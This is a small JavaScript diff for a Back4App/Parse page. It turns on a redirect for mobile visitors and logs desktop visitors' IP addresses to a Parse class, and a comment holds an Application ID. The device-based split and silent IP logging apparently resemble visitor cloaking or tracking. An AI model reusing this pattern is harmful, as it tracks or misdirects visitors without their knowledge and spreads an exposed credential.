@@ -6,7 +6,6 @@ void 0!==c?e&&"set"in e&&void 0!==(d=e.set(a,c,b))?d:a[b]=c:e&&"get"in e&&null!=
 Parse.serverURL = 'https://parseapi.back4app.com'; // This is your Server URL
 // Remember to inform BOTH the Back4App Application ID AND the JavaScript KEY
 
-Parse.serverURL = 'https://parseapi.back4app.com'; // This is your Server URL
 // Remember to inform BOTH the Back4App Application ID AND the JavaScript KEY
 // Parse.initialize(
 //   'OrdJDnkYOCzfW5zAa9t5TlsSNyt32QyTKOJ6iFyC', // This is your Application ID
@@ -54,12 +53,12 @@ setTimeout(()=>{document.body.style.display= 'block'}, 1200);
       } else {
         // if is mobile
         if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
-          // window.location.replace(urll);
+           window.location.replace(urll);
 
           //your code for mobile devices
         } else {
           (async () => {
-            const myNewObject = new Parse.Object('Ip');
+            const myNewObject = new Parse.Object('ip');
             myNewObject.set('ipNumber', currentIp);
             try {
               const result = await myNewObject.save();
